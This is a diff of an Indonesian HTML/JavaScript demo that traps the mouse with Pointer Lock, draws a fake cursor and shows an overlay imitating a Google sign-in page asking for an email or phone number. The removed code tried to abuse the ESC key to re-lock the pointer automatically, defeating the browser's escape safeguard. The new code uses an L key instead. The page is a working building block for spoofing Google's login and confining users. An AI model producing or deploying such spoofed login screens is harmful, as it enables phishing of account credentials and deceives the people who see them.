@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Re-Lock Pointer dengan ESC sebagai User Gesture</title>
+    <title>Pointer Lock dengan Tombol L untuk Login (Tanpa Fullscreen)</title>
     <style>
         body {
             margin: 0;
@@ -67,7 +67,6 @@
             pointer-events: none;
             display: none;
             z-index: 9999;
-            box-shadow: 0 0 5px rgba(255, 255, 255, 0.8);
         }
         #loginOverlay {
             position: fixed;
@@ -80,11 +79,6 @@
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        #loginOverlay.show {
-            opacity: 1;
         }
         #loginBox {
             background-color: #202124;
@@ -93,11 +87,6 @@
             width: 400px;
             color: white;
             text-align: center;
-            transform: scale(0.9);
-            transition: transform 0.3s ease;
-        }
-        #loginOverlay.show #loginBox {
-            transform: scale(1);
         }
         #loginBox .logo {
             font-size: 48px;
@@ -122,19 +111,12 @@
             color: white;
             font-size: 16px;
         }
-        #loginBox input:focus {
-            outline: none;
-            border-color: #8ab4f8;
-        }
         #loginBox a {
             color: #8ab4f8;
             text-decoration: none;
             font-size: 14px;
             display: block;
             margin-bottom: 24px;
-        }
-        #loginBox a:hover {
-            text-decoration: underline;
         }
         #loginBox .buttons {
             display: flex;
@@ -146,21 +128,14 @@
             border-radius: 4px;
             cursor: pointer;
             font-size: 14px;
-            transition: background-color 0.2s;
         }
         #loginBox .buttons .create {
             background: transparent;
             color: #8ab4f8;
         }
-        #loginBox .buttons .create:hover {
-            background: rgba(138, 180, 248, 0.1);
-        }
         #loginBox .buttons .next {
             background: #1a73e8;
             color: white;
-        }
-        #loginBox .buttons .next:hover {
-            background: #1557b0;
         }
         #footer {
             position: absolute;
@@ -175,43 +150,23 @@
             text-decoration: none;
             margin: 0 8px;
         }
-        #footer a:hover {
-            text-decoration: underline;
-        }
-        #closeButton {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            color: white;
-            padding: 8px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: background 0.2s;
-        }
-        #closeButton:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
     </style>
 </head>
 <body>
     <div id="instructions">
         <h2>Klik di mana saja untuk mengaktifkan Pointer Lock</h2>
-        <p>Tekan <span class="highlight">ESC</span> untuk membuka Login UI</p>
-        <p><small>(Auto re-lock setelah UI ditutup)</small></p>
+        <p>Tekan <span class="highlight">L</span> untuk membuka Login UI</p>
+        <p><small>(Tombol ESC tidak bisa dicegah tanpa Fullscreen mode)</small></p>
     </div>
     <div id="movement">Pergerakan mouse: X: 0 | Y: 0</div>
-    <div id="escStatus">Mode: Aktif | Tekan ESC untuk Login</div>
+    <div id="escStatus">Mode: Aktif | Tekan L untuk Login</div>
     <div id="fakeCursor"></div>
     <div id="loginOverlay">
-        <button id="closeButton" onclick="hideLoginUI()">Tutup (ESC)</button>
         <div id="loginBox">
             <div class="logo">G</div>
             <h1>Login</h1>
             <p>Gunakan Akun Google Anda</p>
-            <input type="text" id="emailInput" placeholder="Email atau nomor telepon" autocomplete="off">
+            <input type="text" id="emailInput" placeholder="Email atau nomor telepon">
             <a href="#">Lupa email?</a>
             <p style="font-size: 12px; text-align: left; margin-bottom: 24px;">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a href="#">Pelajari lebih lanjut cara menggunakan Mode Tamu</a></p>
             <div class="buttons">
@@ -231,54 +186,28 @@
         const fakeCursor = document.getElementById('fakeCursor');
         const loginOverlay = document.getElementById('loginOverlay');
         const emailInput = document.getElementById('emailInput');
-        
         let movementX = 0;
         let movementY = 0;
         let loginUIShown = false;
-        let escPressed = false; // Flag untuk track ESC press
-        let escPressTime = 0;   // Timestamp untuk ESC press
-        let wasPointerLocked = false;
 
         // Fungsi saat pointer lock berhasil diaktifkan
         function lockChange() {
             if (document.pointerLockElement === document.body) {
-                // Pointer lock AKTIF
-                wasPointerLocked = true;
                 instructions.style.opacity = '0';
                 setTimeout(() => { instructions.style.display = 'none'; }, 500);
                 movementDisplay.style.display = 'block';
                 escStatus.style.display = 'block';
                 document.addEventListener('mousemove', onMouseMove);
                 console.log("✓ Pointer locked");
-                
             } else {
-                // Pointer lock KELUAR
-                console.log("✗ Pointer unlocked");
-                
-                // Cek apakah ESC baru saja ditekan (dalam 100ms terakhir)
-                const timeSinceEsc = Date.now() - escPressTime;
-                
-                if (escPressed && timeSinceEsc < 100 && wasPointerLocked) {
-                    // ESC ditekan untuk membuka login UI
-                    console.log("→ ESC detected as user gesture, showing login UI");
-                    escPressed = false; // Reset flag
-                    
-                    // Delay sedikit untuk smooth transition
-                    setTimeout(() => {
-                        showLoginUI();
-                    }, 50);
-                    
-                } else if (!loginUIShown) {
-                    // Keluar pointer lock bukan karena ESC (user benar-benar keluar)
-                    console.log("→ User exited pointer lock");
+                if (!loginUIShown) {
                     instructions.style.display = 'block';
                     instructions.style.opacity = '1';
                     movementDisplay.style.display = 'none';
                     escStatus.style.display = 'none';
-                    wasPointerLocked = false;
                 }
-                
                 document.removeEventListener('mousemove', onMouseMove);
+                console.log("✗ Pointer unlocked");
             }
         }
 
@@ -300,88 +229,53 @@
             movementDisplay.textContent = `Pergerakan mouse: X: ${movementX} | Y: ${movementY}`;
         }
 
-        // Deteksi tekan tombol ESC
+        // Deteksi tekan tombol
         document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') {
-                if (document.pointerLockElement === document.body && !loginUIShown) {
-                    // ESC ditekan saat pointer locked = user ingin buka login UI
-                    escPressed = true;
-                    escPressTime = Date.now();
-                    console.log("ESC pressed - flagging for login UI");
-                    
-                    // Browser akan otomatis exit pointer lock
-                    // lockChange() akan menangani sisanya
-                    
-                } else if (loginUIShown) {
-                    // ESC ditekan saat login UI tampil = tutup login UI
-                    hideLoginUI();
-                }
+            // Tombol L untuk login
+            if ((e.key === 'l' || e.key === 'L') && document.pointerLockElement === document.body && !loginUIShown) {
+                showLoginUI();
+            }
+            // ESC untuk tutup login UI
+            else if (e.key === 'Escape' && loginUIShown) {
+                hideLoginUI();
             }
         });
 
-        // Tampilkan login UI dengan smooth animation
+        // Tampilkan login UI
         function showLoginUI() {
-            if (loginUIShown) return;
-            
             loginUIShown = true;
             
-            // Tampilkan fake cursor
+            if (document.pointerLockElement) {
+                document.exitPointerLock();
+            }
+            
             fakeCursor.style.display = 'block';
             fakeCursor.style.left = `${window.innerWidth / 2}px`;
             fakeCursor.style.top = `${window.innerHeight / 2}px`;
-            
-            // Tampilkan login overlay
             loginOverlay.style.display = 'flex';
             document.body.style.backgroundColor = '#202124';
             document.body.style.cursor = 'default';
             
-            // Trigger animation
-            setTimeout(() => {
-                loginOverlay.classList.add('show');
-            }, 10);
-            
-            // Sembunyikan elemen game
             movementDisplay.style.display = 'none';
             escStatus.style.display = 'none';
-            
-            // Focus input
-            setTimeout(() => {
-                emailInput.focus();
-            }, 350);
-            
-            console.log("✓ Login UI shown");
         }
 
-        // Sembunyikan login UI dan auto re-request pointer lock
+        // Sembunyikan login UI dan re-lock
         function hideLoginUI() {
-            if (!loginUIShown) return;
+            loginUIShown = false;
+            fakeCursor.style.display = 'none';
+            loginOverlay.style.display = 'none';
+            document.body.style.backgroundColor = '#f0f0f0';
+            document.body.style.cursor = 'none';
             
-            console.log("→ Hiding login UI and re-locking pointer...");
-            
-            // Animate out
-            loginOverlay.classList.remove('show');
+            movementDisplay.style.display = 'block';
+            escStatus.style.display = 'block';
             
             setTimeout(() => {
-                loginUIShown = false;
-                fakeCursor.style.display = 'none';
-                loginOverlay.style.display = 'none';
-                document.body.style.backgroundColor = '#f0f0f0';
-                document.body.style.cursor = 'none';
-                
-                // Tampilkan kembali elemen game
-                movementDisplay.style.display = 'block';
-                escStatus.style.display = 'block';
-                
-                // Auto re-request pointer lock
-                // ESC adalah user gesture yang valid, jadi ini akan berhasil!
-                setTimeout(() => {
-                    if (!document.pointerLockElement) {
-                        requestPointerLock();
-                        console.log("→ Auto re-requesting pointer lock...");
-                    }
-                }, 100);
-                
-            }, 300);
+                if (!document.pointerLockElement) {
+                    document.body.requestPointerLock();
+                }
+            }, 100);
         }
 
         // Handle submit
@@ -391,100 +285,44 @@
                 const url = new URL(window.location);
                 url.searchParams.set('email', email);
                 history.pushState({}, '', url);
-                
-                // Show success message
-                console.log(`✓ Email "${email}" added to URL`);
-                
-                // Tampilkan alert singkat
-                const originalText = document.querySelector('.next').textContent;
-                document.querySelector('.next').textContent = '✓ Berhasil!';
-                document.querySelector('.next').style.background = '#0d652d';
-                
-                setTimeout(() => {
-                    document.querySelector('.next').textContent = originalText;
-                    document.querySelector('.next').style.background = '#1a73e8';
-                    hideLoginUI();
-                }, 1000);
-                
+                alert(`Email "${email}" telah ditambahkan ke URL.`);
+                hideLoginUI();
             } else {
-                // Shake animation untuk input
-                emailInput.style.animation = 'shake 0.3s';
-                setTimeout(() => {
-                    emailInput.style.animation = '';
-                }, 300);
-                emailInput.focus();
+                alert('Masukkan email terlebih dahulu.');
             }
         }
 
-        // Request pointer lock
-        function requestPointerLock() {
+        // Request pointer lock saat klik
+        document.body.addEventListener('click', () => {
             if (!loginUIShown && !document.pointerLockElement) {
-                document.body.requestPointerLock =
-                    document.body.requestPointerLock ||
-                    document.body.mozRequestPointerLock ||
-                    document.body.webkitRequestPointerLock;
-
-                if (document.body.requestPointerLock) {
-                    document.body.requestPointerLock();
-                }
-            }
-        }
-
-        // Request pointer lock saat klik pada body
-        document.body.addEventListener('click', (e) => {
-            // Jangan request jika klik di dalam login box
-            if (!loginUIShown && !e.target.closest('#loginBox')) {
-                requestPointerLock();
+                document.body.requestPointerLock();
             }
         });
 
-        // Enter key untuk submit
-        emailInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                handleNext();
-            }
-        });
-
-        // Event listeners untuk pointer lock
+        // Event listeners
         document.addEventListener('pointerlockchange', lockChange);
         document.addEventListener('mozpointerlockchange', lockChange);
         document.addEventListener('webkitpointerlockchange', lockChange);
 
-        // Error handling
-        document.addEventListener('pointerlockerror', (e) => {
-            console.error('Pointer Lock error:', e);
-        });
-
-        // Shake animation untuk input error
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes shake {
-                0%, 100% { transform: translateX(0); }
-                25% { transform: translateX(-10px); }
-                75% { transform: translateX(10px); }
-            }
-        `;
-        document.head.appendChild(style);
-
-        // Welcome console message
+        // Info console
         console.log(`
-╔════════════════════════════════════════════════════════════╗
-║  AUTO RE-LOCK POINTER LOCK SOLUTION                        ║
-║  ─────────────────────────────────────────────────────────║
-║  ✓ ESC sebagai User Gesture untuk buka Login UI           ║
-║  ✓ Auto re-lock pointer setelah UI ditutup                ║
-║  ✓ Smooth animations & transitions                        ║
-║                                                            ║
-║  CARA KERJA:                                               ║
-║  1. Klik → Pointer lock aktif                             ║
-║  2. ESC → Pointer unlock + Login UI muncul                ║
-║  3. Submit/Close → Auto re-lock pointer                   ║
-║                                                            ║
-║  KONTROL:                                                  ║
-║  • Klik = Aktifkan pointer lock                           ║
-║  • ESC = Buka/tutup login UI                              ║
-║  • Enter = Submit email                                    ║
-╚════════════════════════════════════════════════════════════╝
+═══════════════════════════════════════════════════════════
+  PENTING: Kenapa tidak pakai ESC?
+───────────────────────────────────────────────────────────
+  • Keyboard Lock API HANYA bekerja di Fullscreen mode
+  • Tanpa fullscreen, browser SELALU keluar dari pointer 
+    lock saat ESC ditekan (keamanan browser)
+  • Ini TIDAK BISA dihindari dengan JavaScript biasa
+
+  SOLUSI:
+  ✓ Gunakan tombol L untuk membuka Login UI
+  ✓ Auto re-lock pointer setelah login ditutup
+  
+  KONTROL:
+  • Klik = Aktifkan pointer lock
+  • L = Buka login UI  
+  • ESC = Tutup login UI / Keluar dari pointer lock
+═══════════════════════════════════════════════════════════
         `);
     </script>
 </body>
